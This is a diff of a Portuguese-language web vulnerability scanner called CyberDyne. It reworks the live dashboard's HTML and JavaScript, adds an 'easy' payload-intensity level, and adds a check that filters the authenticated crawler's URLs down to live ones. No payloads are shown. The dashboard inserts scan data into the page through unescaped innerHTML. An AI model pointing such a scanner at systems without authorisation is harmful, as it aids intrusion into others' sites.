   </div>
-</div>
 
-<!-- Subdomains -->
-<div class="px-6 pb-6">
-  <div class="bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
-    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Subdominios</h3>
-    <div id="subdomain-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2 max-h-40 overflow-y-auto">
-      <p class="text-white/20 text-sm italic col-span-full">Nenhum subdomain encontrado ainda</p>
+  <!-- Subdomains -->
+  <div class="px-5 pb-3">
+    <div class="bg-[#0c0c0c] border border-white/5 rounded-xl p-3">
+      <p class="text-[11px] font-semibold text-white/40 mb-2 uppercase tracking-widest">Subdomínios</p>
+      <div id="subdomain-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-1.5 max-h-28 overflow-y-auto">
+        <p class="text-white/20 text-xs italic col-span-full">Nenhum subdomain encontrado ainda</p>
+      </div>
     </div>
   </div>
-</div>
 
-<!-- Footer -->
-<footer class="border-t border-white/5 px-6 py-3 text-center">
-  <p class="text-xs text-white/20">CyberDyne v6.0 | Live Dashboard</p>
-</footer>
+  <!-- Footer -->
+  <footer class="border-t border-white/5 px-5 py-2 text-center">
+    <p class="text-[10px] text-white/15">CyberDyne v6.0 | Live Dashboard</p>
+  </footer>
+
+</div><!-- end scrollable -->
 
 <script>
-const sevColors = {CRITICO:'#ef4444',ALTO:'#f97316',MEDIO:'#3b82f6',BAIXO:'#22c55e'};
-let chart;
-const timeLabels = [];
-const vulnData = [];
-const checkData = [];
+const sevColors={CRITICO:'#ef4444',ALTO:'#f97316',MEDIO:'#3b82f6',BAIXO:'#22c55e'};
+let chart=null;
+const timeLabels=[],vulnData=[],checkData=[];
+let startTime=Date.now();
 
-function initChart() {
-  const ctx = document.getElementById('timeline-chart').getContext('2d');
-  chart = new Chart(ctx, {
-    type: 'line',
-    data: {
-      labels: timeLabels,
-      datasets: [
-        {label:'Vulneraveis',data:vulnData,borderColor:'#ef4444',backgroundColor:'rgba(239,68,68,0.1)',fill:true,tension:0.4,pointRadius:0,borderWidth:2},
-        {label:'Checks',data:checkData,borderColor:'#ffffff40',backgroundColor:'transparent',fill:false,tension:0.4,pointRadius:0,borderWidth:1,borderDash:[4,4]}
+function initChart(){
+  const ctx=document.getElementById('timeline-chart');
+  if(!ctx||typeof Chart==='undefined')return;
+  chart=new Chart(ctx,{
+    type:'line',
+    data:{
+      labels:timeLabels,
+      datasets:[
+        {label:'Vulneráveis',data:vulnData,borderColor:'#ef4444',backgroundColor:'rgba(239,68,68,0.08)',fill:true,tension:0.4,pointRadius:2,pointBackgroundColor:'#ef4444',borderWidth:2},
+        {label:'Checks',data:checkData,borderColor:'rgba(255,255,255,0.15)',backgroundColor:'transparent',fill:false,tension:0.4,pointRadius:0,borderWidth:1,borderDash:[4,4]}
       ]
     },
-    options: {
-      responsive:true,
-      maintainAspectRatio:false,
-      plugins:{legend:{display:true,labels:{color:'#ffffff60',font:{size:10}}}},
+    options:{
+      responsive:true,maintainAspectRatio:false,
+      animation:{duration:200},
+      plugins:{legend:{display:true,labels:{color:'rgba(255,255,255,0.35)',font:{size:10},boxWidth:12}}},
       scales:{
-        x:{display:true,ticks:{color:'#ffffff20',maxTicksLimit:8,font:{size:9}},grid:{color:'#ffffff08'}},
-        y:{display:true,ticks:{color:'#ffffff20',font:{size:9}},grid:{color:'#ffffff08'},beginAtZero:true}
+        x:{display:true,ticks:{color:'rgba(255,255,255,0.15)',maxTicksLimit:6,font:{size:8}},grid:{color:'rgba(255,255,255,0.04)'}},
+        y:{display:true,ticks:{color:'rgba(255,255,255,0.15)',font:{size:8}},grid:{color:'rgba(255,255,255,0.04)'},beginAtZero:true}
       }
     }
   });
 }
 
-function updateDashboard(data) {
-  document.getElementById('target').textContent = data.target || '';
-  document.getElementById('phase').textContent = data.phase || '';
+function updateElapsed(){
+  const s=Math.floor((Date.now()-startTime)/1000);
+  const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;
+  document.getElementById('elapsed').textContent=
+    (h?h+'h ':'')+m+'m '+String(sec).padStart(2,'0')+'s';
+}
 
-  // Status badge
-  const badge = document.getElementById('status-badge');
-  if (data.status === 'complete') { badge.textContent='COMPLETO'; badge.className='inline-block px-3 py-1 rounded-full text-xs font-bold bg-green-900/30 text-green-400'; }
+function updateDashboard(data){
+  document.getElementById('target').textContent=data.target||'';
+  document.getElementById('phase').textContent=data.phase||'';
+  const badge=document.getElementById('status-badge');
+  if(data.status==='complete'){badge.textContent='COMPLETO';badge.className='px-2.5 py-1 rounded-full text-xs font-bold bg-green-900/30 text-green-400';}
+  const pct=data.total>0?Math.round(data.progress/data.total*100):0;
+  document.getElementById('progress-bar').style.width=pct+'%';
+  document.getElementById('progress-text').textContent=data.total>0?data.progress+'/'+data.total+' ('+pct+'%)':'';
+  const s=data.results_summary||{};
+  document.getElementById('cnt-critico').textContent=s.critico||0;
+  document.getElementById('cnt-alto').textContent=s.alto||0;
+  document.getElementById('cnt-medio').textContent=s.medio||0;
+  document.getElementById('cnt-baixo').textContent=s.baixo||0;
+  document.getElementById('cnt-seguro').textContent=s.seguro||0;
+  document.getElementById('stat-subs').textContent=(data.subdomains||[]).length;
+  document.getElementById('stat-checks').textContent=data.progress||0;
+  const tv=(s.critico||0)+(s.alto||0)+(s.medio||0)+(s.baixo||0);
+  document.getElementById('stat-vulns').textContent=tv;
 
-  // Progress
-  const pct = data.total > 0 ? Math.round(data.progress / data.total * 100) : 0;
-  document.getElementById('progress-bar').style.width = pct + '%';
-  document.getElementById('progress-text').textContent = data.total > 0 ? data.progress + '/' + data.total + ' (' + pct + '%)' : '';
-
-  // Severity counts
-  const s = data.results_summary || {};
-  document.getElementById('cnt-critico').textContent = s.critico || 0;
-  document.getElementById('cnt-alto').textContent = s.alto || 0;
-  document.getElementById('cnt-medio').textContent = s.medio || 0;
-  document.getElementById('cnt-baixo').textContent = s.baixo || 0;
-  document.getElementById('cnt-seguro').textContent = s.seguro || 0;
-
-  // Stats
-  document.getElementById('stat-subs').textContent = (data.subdomains || []).length;
-  document.getElementById('stat-checks').textContent = data.progress || 0;
-  const totalVulns = (s.critico||0) + (s.alto||0) + (s.medio||0) + (s.baixo||0);
-  document.getElementById('stat-vulns').textContent = totalVulns;
-
-  // Timeline chart
-  if (data.timeline && data.timeline.length > 0) {
-    const latest = data.timeline[data.timeline.length - 1];
-    if (!timeLabels.length || timeLabels[timeLabels.length-1] !== latest.t) {
+  // Timeline
+  if(chart&&data.timeline&&data.timeline.length>0){
+    const latest=data.timeline[data.timeline.length-1];
+    if(!timeLabels.length||timeLabels[timeLabels.length-1]!==latest.t){
       timeLabels.push(latest.t);
-      vulnData.push(latest.vulns || 0);
-      checkData.push(latest.checks || 0);
-      if (timeLabels.length > 60) { timeLabels.shift(); vulnData.shift(); checkData.shift(); }
+      vulnData.push(latest.vulns||0);
+      checkData.push(latest.checks||0);
+      if(timeLabels.length>80){timeLabels.shift();vulnData.shift();checkData.shift();}
       chart.update('none');
     }
   }
 
-  // Vuln feed
-  const feed = document.getElementById('vuln-feed');
-  const vulns = data.vulns || [];
-  if (vulns.length > 0) {
-    feed.innerHTML = '';
-    for (const v of vulns.slice(-25).reverse()) {
-      const color = sevColors[v.sev] || '#6b7280';
-      const div = document.createElement('div');
-      div.className = 'flex items-center gap-3 py-1.5 px-2 rounded bg-white/[0.02] slide-in';
-      div.innerHTML = '<span style="color:'+color+'" class="font-bold text-xs w-16">['+String(v.id).padStart(3,'0')+']</span>' +
-        '<span class="text-sm flex-1 truncate">'+v.name+'</span>' +
-        '<span style="color:'+color+'" class="text-xs font-semibold">'+v.sev+'</span>';
-      feed.appendChild(div);
+  // Vuln feed (latest 30, newest on top)
+  const feed=document.getElementById('vuln-feed');
+  const vulns=data.vulns||[];
+  if(vulns.length>0){
+    feed.innerHTML='';
+    for(const v of vulns.slice(-30).reverse()){
+      const col=sevColors[v.sev]||'#6b7280';
+      const d=document.createElement('div');
+      d.className='flex items-center gap-2 py-1 px-2 rounded bg-white/[0.025] slide-in';
+      d.innerHTML='<span style="color:'+col+';min-width:3rem" class="font-bold text-xs font-mono">['+String(v.id).padStart(3,'0')+']</span>'+
+        '<span class="text-xs flex-1 truncate text-white/70">'+v.name+'</span>'+
+        '<span style="color:'+col+'" class="text-[10px] font-bold shrink-0">'+v.sev+'</span>';
+      feed.appendChild(d);
     }
   }
 
   // Subdomains
-  const sgrid = document.getElementById('subdomain-grid');
-  const subs = data.subdomains || [];
-  if (subs.length > 0) {
-    sgrid.innerHTML = '';
-    for (const sub of subs.slice(0, 50)) {
-      const div = document.createElement('div');
-      div.className = 'text-xs text-white/50 truncate py-1 px-2 bg-white/[0.02] rounded';
-      div.innerHTML = '<span class="text-green-500 mr-1">&#9679;</span>' + sub;
-      sgrid.appendChild(div);
+  const sgrid=document.getElementById('subdomain-grid');
+  const subs=data.subdomains||[];
+  if(subs.length>0){
+    sgrid.innerHTML='';
+    for(const sub of subs.slice(0,80)){
+      const d=document.createElement('div');
+      d.className='text-[10px] text-white/40 truncate py-0.5 px-1.5 bg-white/[0.02] rounded font-mono';
+      d.innerHTML='<span class="text-green-600 mr-1">&#9679;</span>'+sub;
+      sgrid.appendChild(d);
     }
   }
 }
 
-initChart();
-setInterval(() => {
-  fetch('/api/status').then(r => r.json()).then(updateDashboard).catch(() => {});
-}, 2000);
+window.addEventListener('load',()=>{
+  initChart();
+  setInterval(updateElapsed,1000);
+  setInterval(()=>{
+    fetch('/api/status').then(r=>r.json()).then(updateDashboard).catch(()=>{});
+  },2000);
+});
 </script>
 </body></html>'''
 
@@ -16277,6 +16499,8 @@ Exemplos de uso:
 
     # ── Payload Intensity ─────────────────────────────────────────────────────
     _intensity = parser.add_mutually_exclusive_group()
+    _intensity.add_argument("--easy", action="store_true", default=False,
+                            help="10%% dos payloads — reconhecimento rapido (~2 min)")
     _intensity.add_argument("--medium", action="store_true", default=False,
                             help="30%% dos payloads — scan rapido (~5 min)")
     _intensity.add_argument("--hard", action="store_true", default=False,
@@ -16473,13 +16697,15 @@ Exemplos de uso:
         log(f"  {Fore.GREEN}[AUTH] Header Authorization configurado: {_auth_header[:30]}...{Style.RESET_ALL}")
 
     # ── Payload Intensity ────────────────────────────────────────────────────
-    if args.medium:
+    if args.easy:
+        _PAYLOAD_INTENSITY = 0.1
+    elif args.medium:
         _PAYLOAD_INTENSITY = 0.3
     elif args.insane:
         _PAYLOAD_INTENSITY = 1.0
     else:
         _PAYLOAD_INTENSITY = 0.6  # --hard ou default
-    _intensity_labels = {0.3: "MEDIUM (30%)", 0.6: "HARD (60%)", 1.0: "INSANE (100%)"}
+    _intensity_labels = {0.1: "EASY (10%)", 0.3: "MEDIUM (30%)", 0.6: "HARD (60%)", 1.0: "INSANE (100%)"}
     log(f"  {Fore.YELLOW}[INTENSITY] {_intensity_labels[_PAYLOAD_INTENSITY]}{Style.RESET_ALL}")
 
     # ── Live Dashboard ─────────────────────────────────────────────────────────
@@ -16611,8 +16837,33 @@ Exemplos de uso:
             crawler = AuthenticatedCrawler(login_url, auth_user, auth_pass, base_domain)
             auth_urls = crawler.run()
             if auth_urls:
-                log(f"\n{Fore.GREEN}[✓] {len(auth_urls)} URLs autenticadas descobertas{Style.RESET_ALL}")
-                all_urls = list(set(all_urls + auth_urls))
+                log(f"\n{Fore.GREEN}[✓] {len(auth_urls)} URLs autenticadas descobertas — validando liveness...{Style.RESET_ALL}")
+                # Validar quais URLs autenticadas estão vivas
+                _live_auth, _dead_auth = [], []
+                def _check_auth_url(u):
+                    try:
+                        rv = requests.head(u, headers=HEADERS_BASE, timeout=6,
+                                           verify=False, allow_redirects=True, cookies=_auth_cookies or {})
+                        if rv.status_code == 405:
+                            rv = requests.get(u, headers=HEADERS_BASE, timeout=6,
+                                              verify=False, allow_redirects=True, cookies=_auth_cookies or {})
+                        return u, rv.status_code
+                    except Exception:
+                        return u, 0
+                with concurrent.futures.ThreadPoolExecutor(max_workers=20) as _ex:
+                    _futures = {_ex.submit(_check_auth_url, u): u for u in auth_urls}
+                    for _f in concurrent.futures.as_completed(_futures):
+                        _u, _st = _f.result()
+                        if _st and _st not in (0, 404, 410, 403, 401):
+                            _live_auth.append(_u)
+                        else:
+                            _dead_auth.append((_u, _st))
+                log(f"  {Fore.GREEN}[LOGIN] {len(_live_auth)} URLs ativas | {Fore.RED}{len(_dead_auth)} mortas/bloqueadas{Style.RESET_ALL}")
+                for _du, _ds in _dead_auth[:5]:
+                    log(f"    {Fore.RED}✗ [{_ds}] {_du[:80]}{Style.RESET_ALL}")
+                for _lu in _live_auth[:10]:
+                    log(f"    {Fore.GREEN}✓ {_lu[:80]}{Style.RESET_ALL}")
+                all_urls = list(set(all_urls + _live_auth))
         except Exception as e:
             log(f"{Fore.YELLOW}[~] Erro no crawler autenticado: {e}{Style.RESET_ALL}")
 
